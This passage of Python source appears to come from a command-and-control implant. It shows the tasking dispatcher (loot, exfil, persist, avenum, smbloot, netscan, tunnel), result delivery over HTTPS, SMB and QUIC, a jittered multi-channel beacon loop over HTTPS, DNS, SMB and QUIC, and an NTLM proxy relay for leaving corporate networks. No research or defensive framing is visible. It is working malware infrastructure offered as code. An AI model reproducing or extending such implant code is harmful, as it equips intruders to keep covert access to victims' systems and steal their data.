            elif cmd == "write":
                output = self._exec_write(args, data)

            elif cmd == "upload":
                output = self._exec_upload(args, data)

            elif cmd == "download":
                dl = self._exec_download(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    output = f"Downloaded {dl['filename']} ({dl['size']} bytes)"
                    result_data = dl

            elif cmd == "loot":
                dl = self._exec_loot(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    fc = dl.get("files", 1)
                    output = f"Looted {dl['filename']} ({dl['size']} bytes, {fc} files)"
                    result_data = dl

            elif cmd == "exfil":
                output = "Exfil scan triggered"
                logger.info("Exfil tasking received")

            elif cmd == "netscan":
                output = self._exec_netscan(args)

            elif cmd == "arptable":
                output = self._exec_arptable()

            elif cmd == "persist":
                output = self._exec_persist(args)

            elif cmd == "unpersist":
                output = self._exec_unpersist(args)

            elif cmd == "proxyinfo":
                output = self._exec_proxyinfo()

            elif cmd == "avenum":
                output = self._exec_avenum()

            elif cmd == "smbloot":
                output = self._exec_smbloot(args)

            elif cmd == "tunnel":
                output = self._exec_tunnel(args)

            else:
                status = "error"
                output = f"Unknown command: {cmd}"

        except Exception as e:
            status = "error"
            output = f"[exception: {e}]"

        if task_id:
            sent = False
            if self.https_enabled and not sent:
                try:
                    self._send_result_https(task_id, status, output, result_data)
                    sent = True
                except Exception:
                    pass
            if self.smb_enabled and not sent:
                try:
                    self._send_result_smb(task_id, status, output, result_data)
                    sent = True
                except Exception:
                    pass
            if self.quic_enabled and not sent:
                try:
                    self._send_result_quic(task_id, status, output, result_data)
                    sent = True
                except Exception:
                    pass

    # ── Main loop ──

    def _beacon_loop(self):
        logger.info(
            "Beacon started — ID=%s interval=%ds jitter=%d%%",
            self._implant_id, self.interval, int(self.jitter * 100),
        )

        if self.https_enabled:
            attempts = 0
            while self._running and not self._registered and attempts < 10:
                if self._register_https():
                    self._consecutive_failures = 0
                    break
                attempts += 1
                self._consecutive_failures = attempts
                self._backoff_sleep()
            if not self._registered:
                logger.warning("Registration failed, proceeding unregistered")
                self._consecutive_failures = 0

        while self._running:
            tasking = None

            if self.https_enabled:
                tasking = self._beacon_https()

            if tasking is None and self.dns_enabled:
                tasking = self._beacon_dns()

            if tasking is None and self.smb_enabled:
                tasking = self._beacon_smb()
                if tasking and tasking.get("success"):
                    self._registered = True

            if tasking is None and self.quic_enabled:
                tasking = self._beacon_quic()
                if tasking and tasking.get("success"):
                    self._registered = True

            if tasking is None:
                self._consecutive_failures += 1
                if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                    logger.info("Re-registering after %d failures", self._consecutive_failures)
                    self._registered = False
                    self._register_https()
            elif tasking:
                self._consecutive_failures = 0
                logger.debug("Tasking: %s", tasking.get("cmd", "?"))
                self._process_tasking_batch(tasking)
            else:
                self._consecutive_failures = 0

            if self._consecutive_failures > 3:
                self._backoff_sleep()
            else:
                self._jittered_sleep()

    def _init_proxy(self):
        self._proxy_session = _HttpSession()

        if self.proxy_mode == "none":
            self._proxy_session.trust_env = False
            logger.info("Proxy: disabled (direct connection)")
            return

        if self._start_ntlm_relay():
            return

        if self.proxy_mode == "manual" and self.proxy_url:
            self._proxy_session.proxies = {
                "http": self.proxy_url, "https": self.proxy_url,
            }
            logger.info("Proxy: manual — %s", self.proxy_url)
            return

        discovered = self._proxy.discover_all()
        if discovered:
            logger.info("Proxy: %s", self._proxy.summary())
            non_pac = [p for p in discovered if not p.get("is_pac")]
            if non_pac:
                working = self._proxy.select_working(
                    self.callback_url.rsplit("/", 1)[0], timeout=8)
                if working:
                    self._proxy_session.proxies = self._proxy.get_urllib_proxies()
                    return
            logger.info("Proxy: no working proxy found, trying direct")
        else:
            logger.info("Proxy: none discovered, using direct connection")
        self._proxy_session.trust_env = True

    def _start_ntlm_relay(self) -> bool:
        """Start the local NTLM relay if configured. Returns True on success."""
        cfg = self._proxy_ntlm_cfg
        if not cfg.get("enabled"):
            return False

        username = cfg.get("username", "")
        password = cfg.get("password", "")
        if not username or not password:
            logger.warning("Proxy: NTLM enabled but username/password missing — skipping relay")
            return False

        host = cfg.get("host", "")
        port = int(cfg.get("port", 8080) or 8080)
        if not host:
            # No explicit upstream: reuse whatever the discovery found.
            host, port = self._discover_ntlm_upstream(port)
            if not host:
                logger.warning("Proxy: NTLM enabled but no upstream proxy configured "
                               "or discovered — skipping relay")
                return False
            logger.info("Proxy: NTLM upstream auto-discovered as %s:%d", host, port)

        try:
            relay = _NtlmProxyRelay(
                host, port, username, password,
                domain=cfg.get("domain", ""),
                workstation=cfg.get("workstation", ""),
            )
            relay.start()
        except Exception as e:
            logger.warning("Proxy: NTLM relay failed to start (%s) — falling back", e)
            return False

        self._ntlm_relay = relay
        self._proxy_session.proxies = {"http": relay.url, "https": relay.url}
        logger.info("Proxy: NTLM relay %s -> %s (identity: %s)",
                    relay.url, relay.upstream_url, relay.identity)
        return True

    def _discover_ntlm_upstream(self, default_port: int) -> tuple:
        """Find an upstream proxy host/port for the NTLM relay."""
        candidates = []
        if self.proxy_url:
            candidates.append(self.proxy_url)
        try:
            for proxy in self._proxy.discover_all():
                if not proxy.get("is_pac") and proxy.get("url"):
                    candidates.append(proxy["url"])
        except Exception as e:
            logger.debug("NTLM upstream discovery failed: %s", e)

        for url in candidates:
            netloc = url.split("://", 1)[-1].rstrip("/")
            if "@" in netloc:
                netloc = netloc.rsplit("@", 1)[1]
            host, _, port_str = netloc.partition(":")
            if not host or host.startswith("127."):
                continue
            try:
                return host, int(port_str) if port_str else default_port
            except ValueError:
                return host, default_port
        return "", default_port

    def start(self):
        self._running = True
        self._init_proxy()
        self._thread = threading.Thread(
            target=self._beacon_loop, daemon=True, name="c2-beacon",
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._ntlm_relay:
            self._ntlm_relay.stop()
            self._ntlm_relay = None
        # The beacon is the only way to task the tunnel, so a tunnel that
        # outlived it would be a process nothing could reach and nothing
        # could stop. The record is left in place: see `_tunnel_stop`.
        if self._tunnel_proc is not None and self._tunnel_proc.poll() is None:
            logger.info("Beacon stopping: taking tunnel child pid %d with it",
                        self._tunnel_proc.pid)
            self._tunnel_stop()
        logger.info("Beacon stopped")
